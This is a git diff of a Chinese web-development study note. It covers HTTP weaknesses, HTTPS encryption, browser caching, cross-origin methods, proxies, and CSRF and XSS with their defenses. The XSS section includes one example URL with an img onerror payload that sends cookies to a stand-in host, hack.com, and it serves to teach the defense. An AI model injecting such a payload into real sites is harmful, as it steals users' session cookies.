@@ -161,6 +161,20 @@ tags:
 
 
 
+### HTTP 的缺点
+
+* 通信使用明文（不加密），内容可能会被窃听
+* 不验证通信方的身份，因此有可能遭遇伪装
+* 无法证明报文的完整性，所以有可能已遭篡改
+
+由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使 用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文 使用明文（指未经过加密的报文）方式发送。
+
+
+
+
+
+
+
 ### HTTP2
 
 **二进制分帧**
@@ -182,7 +196,17 @@ http/1.x 是一个超文本协议，而 http2 是一个二进制协议，被称�
 
 
 
-# 网络安全相关
+### HTTPS 采用混合加密机制
+
+**HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密 机制。**若密钥能够实现安全交换，那么有可能会考虑仅使用公开 密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处 理速度要慢。
+
+
+所以应充分利用两者各自的优势，将多种方法组合起来用于通 信。**在交换密钥环节使用公开密钥加密方式，之后的建立通信交 换报文阶段则使用共享密钥加密方式。**
+
+
+>公开密钥加密处理起来比共享密钥加密方式更为复杂，因此若在通信时使用公开密钥加密方式，效率就很低
+
+
 
 
 
@@ -222,7 +246,507 @@ Cache-Control: private, max-age=0, no-cache
 
 
 
-# 跨域
+
+
+
+
+
+## 浏览器缓存
+
+[网站链接](https://www.cnblogs.com/shixiaomiao1122/p/7591556.html)
+
+
+
+[https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#%E2%80%9Cno-cache%E2%80%9D%E5%92%8C%E2%80%9Cno-store%E2%80%9D](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#"no-cache"和"no-store")
+
+
+
+* 强缓存 (直接拿来用）
+  用户发送的请求，直接从客户端缓存中获取，不发送请求到服务器，不与服务器发生交互行为。
+  * Expires Expires:Thu,21 Jan 2017 23:39:02 GMT(绝对时间 服务器下发的)
+    **存在的问题：服务器时间与客户端时间的不一致，就会导致缓存跟期待效果出现偏差。**
+  * Cache-Control Cache-Control:max-age=3600(相对时间 单位:秒 客户端)
+* 协商缓存 (问一下服务器)
+  用户发送的请求，发送到服务器后，由服务器判定是否从缓存中获取资源。
+  * Last-Modified if-Modified-Since Last-Modified:Wed,26 Jan 2017 00:35:11 GMT
+  * Etag if-None-Match (相当于hash值)
+
+
+
+>两者的区别：从名字就可以看出，强缓存不与服务器交互，而协商缓存则需要与服务器交互。
+
+
+![enter description here][13]
+
+
+
+
+
+**简单介绍下Cache-Control的属性设置:**
+
+1. max-age: 设置缓存的最大的有效时间，单位为秒（s）。max-age会覆盖掉Expires  **（注意：max-age 和 Expires  都属于强缓存）**
+2. s-maxage: 只用于共享缓存，比如CDN缓存（s -> share）。与max-age 的区别是：max-age用于普通缓存，
+   而s-maxage用于代理缓存。如果存在s-maxage,则会覆盖max-age 和 Expires.
+3. public：响应会被缓存，并且在多用户间共享。默认是public。
+4. private: 响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。
+5. no-cache: 指定不缓存响应，表明资源不进行缓存。但是设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，将过期时间设为过去的时间。
+6. no-store: 绝对禁止缓存。
+7. must-revalidate: 如果页面过期，则去服务器进行获取。
+
+
+
+-----
+
+
+
+
+
+
+
+- no-cache: 告诉浏览器、缓存服务器，不管本地副本是否过期，使用资源副本前，**一定要到源服务器进行副本有效性校验**。
+- must-revalidate：告诉浏览器、缓存服务器，本地副本过期前，可以使用本地副本；本地副本一旦过期，必须去源服务器进行有效性校验。
+
+
+
+-----
+
+
+
+https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#%E2%80%9Cno-cache%E2%80%9D%E5%92%8C%E2%80%9Cno-store%E2%80%9D
+
+
+
+
+
+### “no-cache”和“no-store”
+
+
+
+“no-cache”**表示必须先与服务器确认返回的响应是否发生了变化**，然后才能使用该响应来满足后续对同一网址的请求。 因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，但如果资源未发生变化，则可避免下载。
+
+
+
+相比之下，“no-store”则要简单得多。 它直接禁止浏览器以及所有中间缓存存储任何版本的返回响应，例如，包含个人隐私数据或银行业务数据的响应。 每次用户请求该资产时，都会向服务器发送请求，并下载完整的响应。
+
+
+
+所以总结出一个观点:
+
+
+
+**no-cache不代表没有缓存**
+
+**no-cache不代表没有缓存**
+
+**no-cache不代表没有缓存**
+
+
+
+
+
+实际上Cache-Control: no-cache是会被缓存的，只不过每次在向客户端（浏览器）提供响应数据时，缓存都要向服务器评估缓存响应的有效性。
+
+
+
+
+
+
+
+### “public”与 “private”
+
+
+
+如果响应被标记为“public”，则即使它有关联的 HTTP 身份验证，甚至响应状态代码通常无法缓存，也可以缓存响应。 大多数情况下，“public”不是必需的，因为明确的缓存信息（例如“max-age”）已表示响应是可以缓存的。
+
+相比之下，浏览器可以缓存“private”响应。 不过，这些响应通常只为单个用户缓存，因此不允许任何中间缓存对其进行缓存。 例如，用户的浏览器可以缓存包含用户私人信息的 HTML 网页，但 CDN 却不能缓存。
+
+
+
+
+
+
+
+
+
+
+
+### 缓存流程
+
+
+
+![enter description here][14]
+
+
+
+1. 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期
+2. 查看是否有cache-control 的max-age / s-maxage，没有，则用expires 作为过期时间比较
+
+![enter description here][15]
+
+
+
+判断过程执行完后，如果判定为未过期，则使用客户端缓存，那么就是属于"强缓存"，否则，跟服务器协商是否使用缓存，这就属于"协商缓存"
+
+
+
+![enter description here][16]
+
+到这一步的时候，浏览器会向服务器发送请求，同时如果上一次的缓存中有Last-modified 和 Etag 字段，
+浏览器将在request header 中加入**If-Modified-Since（对应于Last-modified）**， 和**If-None-Match（对应于Etag）**。
+
+
+* Last-modified: 表明请求的资源上次的修改时间。
+* If-Modified-Since：客户端保留的资源上次的修改时间。
+* Etag：资源的内容标识。（不唯一，通常为文件的md5或者一段hash值，只要保证写入和验证时的方法一致即可）
+* If-None-Match： 客户端保留的资源内容标识。
+
+
+>1) 分布式系统尽量关闭Etag，因为每台机器生成的Etag都不一样。
+>2) 分布式系统里多台机器间文件的Last-Modified必须一致，以免负载均衡不同导致对比失败。
+
+
+最后附上一张，用户行为影响浏览器的缓存行为。
+
+![enter description here][17]
+
+
+
+
+
+###  **浏览器缓存淘汰策略** 
+
+
+
+[ https://juejin.im/post/5e8b3085f265da47c15cb8bb?utm_source=gold_browser_extension ]( https://juejin.im/post/5e8b3085f265da47c15cb8bb?utm_source=gold_browser_extension )
+
+
+
+ 浏览器中的缓存是一种在本地保存资源副本，它的大小是有限的，当我们请求数过多时，缓存空间会被用满，此时，继续进行网络请求就需要确定缓存中哪些数据被保留，哪些数据被移除 
+
+
+
+ 最常见的淘汰策略有 FIFO（先进先出）、LFU（最少使用）、LRU（最近最少使用）。 
+
+
+
+ LRU （ `Least Recently Used` ：最近最少使用 ）缓存淘汰策略，故名思义，就是根据数据的历史访问记录来进行淘汰数据，其核心思想是 **如果数据最近被访问过，那么将来被访问的几率也更高** ，优先淘汰最近没有被访问到的数据。 
+
+
+
+![](https://user-gold-cdn.xitu.io/2020/4/6/1714fb580920fc36?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)
+
+
+
+
+
+>在 vue2.5.0 版本中，`keep-alive` 新增了 `max` 属性，用于最多可以缓存多少组件实例，一旦这个数字达到了，在新实例被创建之前，已缓存组件中最久没有被访问的实例会被销毁掉，**看，这里就应用了 LRU 算法**。即在 `keep-alive` 中缓存达到 `max`，新增缓存实例会优先淘汰最近没有被访问到的实例
+
+
+
+
+
+
+
+
+
+
+
+
+
+# 跨域通信
+
+[代码地址](https://github.com/QinZhen001/front-end-demo/blob/master/cross-domain/cross-domain.html)
+
+* JSONP(利用script标签的异步加载)
+* Hash(hash改变页面不会刷新)
+* postMessage
+* WebSocket [网站地址](http://www.ruanyifeng.com/blog/2017/05/websocket.html) 
+* CORS [网站地址](http://www.ruanyifeng.com/blog/2016/04/cors.html)
+
+
+>一般静态资源通常不受同源策略限制，如js/css/jpg/png等。
+
+
+## JSONP跨域
+
+JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。
+
+它的基本思想是，网页通过添加一个`<script>`元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。
+
+首先，网页动态插入`<script>`元素，由它向跨源网址发出请求。
+
+```
+function addScriptTag(src) {
+  var script = document.createElement('script');
+  script.setAttribute("type","text/javascript");
+  script.src = src;
+  document.body.appendChild(script);
+}
+
+window.onload = function () {
+  addScriptTag('http://example.com/ip?callback=foo');
+}
+
+function foo(data) {
+  console.log('Your public IP address is: ' + data.ip);
+};
+```
+
+上面代码通过动态添加`<script>`元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。
+
+服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。
+
+```js
+foo({
+  "ip": "8.8.8.8"
+});
+```
+
+由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。
+
+
+## WebSocket跨域
+
+WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。
+
+下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自维基百科）。
+
+```
+GET /chat HTTP/1.1
+Host: server.example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+Sec-WebSocket-Protocol: chat, superchat
+Sec-WebSocket-Version: 13
+Origin: http://example.com
+```
+
+上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。
+
+正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。
+
+```
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
+Sec-WebSocket-Protocol: chat
+```
+
+## postMessage
+
+postMessage是html5新增的一个解决跨域的一个方法
+
+postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。
+
+我们拿跨域中的iframe做例子
+
+```
+<script type="text/javascript">
+    window.parent.postMessage('hello world','*');   
+    //在被嵌套的iframe的页面中写入这样一段代码
+</script>
+```
+
+>window.parent返回当前窗口的父窗口。
+
+
+注意：postMessage的写法，postMessage之前写的是你要通信的window对象（也就是你要像谁通信），此时的window.parent的权限仅限于此，不能在像同域似的，进行获取父级的DOM元素，否则浏览器会报错，提示你不能进行跨域访问，我们再来看postMessage中所接收的参数，第一个参数就是你要像另外一个窗口传递的数据（只能传字符串类型），第二个参数表示目标窗口的源，协议+主机+端口号，是为了安全考虑，如果设置为“*”，则表示可以传递给任意窗口。
+
+```
+<script type="text/javascript">
+    window.addEventListener('message',function(e){
+        console.log(e.data);        //hello world
+        console.log(e.origin);      //http://127.0.0.1:8020 所传来数据的域
+
+    })
+</script>
+```
+
+
+
+## 正向代理和反向代理
+
+[https://www.zhihu.com/question/24723688](https://www.zhihu.com/question/24723688)
+
+
+
+正向代理，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。
+
+
+
+
+
+
+
+反向代理隐藏了真实的服务端，当我们请求 ww.baidu.com 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了。ww.baidu.com 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。
+
+
+
+两者的区别在于代理的对象不一样：**正向代理**代理的对象是客户端，**反向代理**代理的对象是服务端
+
+
+
+
+
+
+
+# 网络安全
+
+* CSRF
+* XSS
+
+## CSRF
+
+[网页链接](http://blog.csdn.net/stpeace/article/details/53512283)
+CSRF跨站点请求伪造(Cross—Site Request Forgery)
+
+
+攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。
+
+
+### CSRF攻击攻击原理及过程：
+
+1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
+2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
+3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
+4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
+5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 
+
+
+
+### CSRF漏洞检测：
+
+检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。
+
+随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。
+
+以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。
+
+### 防御CSRF攻击：
+
+* 验证 HTTP Referer 字段；
+* 在请求地址中添加 token 并验证
+* 在 HTTP 头中自定义属性并验证。
+
+
+**验证 HTTP Referer 字段**：
+根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 `http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory`，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。
+
+这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。
+
+然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。
+
+----------
+
+
+**在请求地址中添加 token 并验证:**
+CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。
+
+
+这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 `http://url?csrftoken=tokenvalue`。 而对于 POST 请求来说，要在 form 的最后加上 `<input type=”hidden” name=”csrftoken” value=”tokenvalue”/>`，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。
+
+该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。
+
+----------
+
+
+**在 HTTP 头中自定义属性并验证**
+这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。
+
+
+然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。
+
+----------
+
+
+**使用axios防止 CSRF**
+
+
+原理:
+axios默认在Request Config里已经设置了
+
+```javascript
+ //  ``xsrfCookieName`是用作xsrf标记值的cookie的名称
+  xsrfCookieName ：' XSRF-TOKEN '，//  默认  
+ 
+  //  ``xsrfHeaderName`是携带xsrf标记值的http标头的名称
+  xsrfHeaderName ：' X-XSRF-TOKEN '，//  默认  
+```
+
+
+
+## XSS
+
+[网页链接](https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==&mid=2651553616&idx=1&sn=17036b87c39e81cbcb8df5d9fb1f906d&chksm=8025a891b75221874054f9f71d40a94973b583e7a444c868c8f94fa76e1c9d8b3c29d68ee6a8&scene=0#rd)
+
+跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+
+反射型：
+URL的构成分为协议、域名、端口、路径、查询几部分构成。
+XSS往往在“查询”部分发现漏洞构造攻击代码实施攻击，所谓“反射”可以理解为hacker并不会直接攻击客户，而是通过URL植入代码通过服务器获取并植入到用户页面完成攻击。
+
+存储型：
+存储型存储型攻击方式和反射型最大的区别就是不通过URL来传播，而是利用站点本身合法的存储结构，比如评论。任何用户都可以通过站点提供的接口提交评论内容，这些评论内容都被存储到服务器的数据库。当用户访问这些评论的时候，服务器从数据库提取内容插入到页面反馈给用户。如果评论内容本身是具备攻击性内容，用户无一幸免。
+
+### XSS的工作原理：
+
+不管是反射型还是存储型，服务端都会将JavaScript当做文本处理，这些文本在服务端被整合进html文档中，在浏览器解析这些文本的过程也就是XSS被执行的时候。
+
+从攻击到执行分为以下几步：
+
+1. 构造攻击代码
+2. 服务端提取并写入HTML
+3. 浏览器解析，XSS执行
+
+
+**构造攻击代码：**
+hacker在发现站点对应的漏洞之后，基本可以确定是使用“反射型”或者“存储型”。对于反射型这个很简单了，执行类似代码：
+
+```
+https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
+```
+
+大家知道很多站点都提供搜索服务，这里的item字段就是给服务端提供关键词。如果hacker将关键词修改成可执行的JavaScript语句，如果服务端不加处理直接将类似代码回显到页面，XSS代码就会被执行。
+
+
+这段代码的含义是告诉浏览器加载一张图片，图片的地址是空，根据加载机制空图片的加载会触发Element的onerror事件，这段代码的onerror事件是将本地cookie传到指定的网站。
+
+
+### XSS的防范措施：
+
+
+
+**编码:**
+对于反射型的代码，服务端代码要对查询进行编码，主要目的就是将查询文本化，避免在浏览器解析阶段转换成DOM和CSS规则及JavaScript解析。
+
+
+**DOM Parse和过滤:**
+从XSS工作的原理可知，在服务端进行编码，在模板解码这个过程对于富文本的内容来说，完全可以被浏览器解析到并执行，进而给了XSS执行的可乘之机。
+
+为了杜绝悲剧发生，我们需要在浏览器解析之后进行解码，得到的文本进行DOM parse拿到DOM Tree，对所有的不安全因素进行过滤，最后将内容交给浏览器，达到避免XSS感染的效果。
+
+----------
+
+
+**Cookies如何防范XSS攻击?**
+
+为了减轻这些攻击，需要在HTTP头部配置set-cookie:
+
+* HttpOnly - 这个属性可以防止cross-site scripting，因为它会禁止Javascript脚本访问cookie。
+* secure - 这个属性告诉浏览器仅在请求为HTTPS时发送cookie。
+
+结果应该是这样的: Set-Cookie: sid=; HttpOnly. **使用Express的话，cookie-session默认配置好了**。
+
+>在cookie-session中httpOnly: a boolean indicating whether the cookie is only to be sent over HTTP(S), and not made available to client JavaScript (true by default).
+
+
+>一个布尔值，指示cookie是否仅通过HTTP（S）发送，并且不提供给客户端JavaScript（true默认情况下）
+
+
+
+
 
 
 
@@ -315,16 +839,6 @@ DNS是应用层协议，事实上他是为其他应用层协议工作的，包�
 
 
 
-### HTTP 的缺点
-
-* 通信使用明文（不加密），内容可能会被窃听
-* 不验证通信方的身份，因此有可能遭遇伪装
-* 无法证明报文的完整性，所以有可能已遭篡改
-
-由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使 用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文 使用明文（指未经过加密的报文）方式发送。
-
-
-
 ### SSL
 
 虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。 SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。
@@ -358,16 +872,7 @@ SSL 采用一种 叫做公开密钥加密（Public-key cryptography）的加密�
 
 
 
-
-### HTTPS 采用混合加密机制
-
-**HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密 机制。**若密钥能够实现安全交换，那么有可能会考虑仅使用公开 密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处 理速度要慢。
-
-
-所以应充分利用两者各自的优势，将多种方法组合起来用于通 信。**在交换密钥环节使用公开密钥加密方式，之后的建立通信交 换报文阶段则使用共享密钥加密方式。**
-
-
->公开密钥加密处理起来比共享密钥加密方式更为复杂，因此若在通信时使用公开密钥加密方式，效率就很低
+>
 
 
 
@@ -465,139 +970,6 @@ SSL 采用一种 叫做公开密钥加密（Public-key cryptography）的加密�
 
 [代码地址](https://github.com/QinZhen001/front-end-demo/blob/master/cross-domain/jsonp.js)
 
-### 跨域通信
-
-[代码地址](https://github.com/QinZhen001/front-end-demo/blob/master/cross-domain/cross-domain.html)
-
-* JSONP(利用script标签的异步加载)
-* Hash(hash改变页面不会刷新)
-* postMessage
-* WebSocket [网站地址](http://www.ruanyifeng.com/blog/2017/05/websocket.html) 
-* CORS [网站地址](http://www.ruanyifeng.com/blog/2016/04/cors.html)
-
-
->一般静态资源通常不受同源策略限制，如js/css/jpg/png等。
-
-
-#### JSONP跨域
-
-JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。
-
-它的基本思想是，网页通过添加一个`<script>`元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。
-
-首先，网页动态插入`<script>`元素，由它向跨源网址发出请求。
-
-```
-function addScriptTag(src) {
-  var script = document.createElement('script');
-  script.setAttribute("type","text/javascript");
-  script.src = src;
-  document.body.appendChild(script);
-}
-
-window.onload = function () {
-  addScriptTag('http://example.com/ip?callback=foo');
-}
-
-function foo(data) {
-  console.log('Your public IP address is: ' + data.ip);
-};
-```
-
-上面代码通过动态添加`<script>`元素，向服务器example.com发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。
-
-服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。
-
-```js
-foo({
-  "ip": "8.8.8.8"
-});
-```
-
-由于`<script>`元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。
-
-
-#### WebSocket跨域
-
-WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。
-
-下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自维基百科）。
-
-```
-GET /chat HTTP/1.1
-Host: server.example.com
-Upgrade: websocket
-Connection: Upgrade
-Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
-Sec-WebSocket-Protocol: chat, superchat
-Sec-WebSocket-Version: 13
-Origin: http://example.com
-```
-
-上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。
-
-正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。
-
-```
-HTTP/1.1 101 Switching Protocols
-Upgrade: websocket
-Connection: Upgrade
-Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
-Sec-WebSocket-Protocol: chat
-```
-
-#### postMessage
-
-postMessage是html5新增的一个解决跨域的一个方法
-
-postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。
-
-我们拿跨域中的iframe做例子
-
-```
-<script type="text/javascript">
-    window.parent.postMessage('hello world','*');   
-    //在被嵌套的iframe的页面中写入这样一段代码
-</script>
-```
-
->window.parent返回当前窗口的父窗口。
-
-
-注意：postMessage的写法，postMessage之前写的是你要通信的window对象（也就是你要像谁通信），此时的window.parent的权限仅限于此，不能在像同域似的，进行获取父级的DOM元素，否则浏览器会报错，提示你不能进行跨域访问，我们再来看postMessage中所接收的参数，第一个参数就是你要像另外一个窗口传递的数据（只能传字符串类型），第二个参数表示目标窗口的源，协议+主机+端口号，是为了安全考虑，如果设置为“*”，则表示可以传递给任意窗口。
-
-```
-<script type="text/javascript">
-    window.addEventListener('message',function(e){
-        console.log(e.data);        //hello world
-        console.log(e.origin);      //http://127.0.0.1:8020 所传来数据的域
-
-    })
-</script>
-```
-
-
-
-#### 正向代理和反向代理
-
-[https://www.zhihu.com/question/24723688](https://www.zhihu.com/question/24723688)
-
-
-
-正向代理，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。
-
-
-
-
-
-
-
-反向代理隐藏了真实的服务端，当我们请求 ww.baidu.com 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了。ww.baidu.com 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。
-
-
-
-两者的区别在于代理的对象不一样：**正向代理**代理的对象是客户端，**反向代理**代理的对象是服务端
-
 
 
 
@@ -653,365 +1025,6 @@ Vary: User-Agent
 当然，`User-Agent` 实在过多，此时缓存失效就会过多。
 
 
-
-
-
-
-### 浏览器缓存
-
-[网站链接](https://www.cnblogs.com/shixiaomiao1122/p/7591556.html)
-
-
-
-[https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#%E2%80%9Cno-cache%E2%80%9D%E5%92%8C%E2%80%9Cno-store%E2%80%9D](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn#"no-cache"和"no-store")
-
-
-
-* 强缓存 (直接拿来用）
-  用户发送的请求，直接从客户端缓存中获取，不发送请求到服务器，不与服务器发生交互行为。
-  * Expires Expires:Thu,21 Jan 2017 23:39:02 GMT(绝对时间 服务器下发的)
-    **存在的问题：服务器时间与客户端时间的不一致，就会导致缓存跟期待效果出现偏差。**
-  * Cache-Control Cache-Control:max-age=3600(相对时间 单位:秒 客户端)
-* 协商缓存 (问一下服务器)
-  用户发送的请求，发送到服务器后，由服务器判定是否从缓存中获取资源。
-  * Last-Modified if-Modified-Since Last-Modified:Wed,26 Jan 2017 00:35:11 GMT
-  * Etag if-None-Match (相当于hash值)
-
-
-
->两者的区别：从名字就可以看出，强缓存不与服务器交互，而协商缓存则需要与服务器交互。
-
-
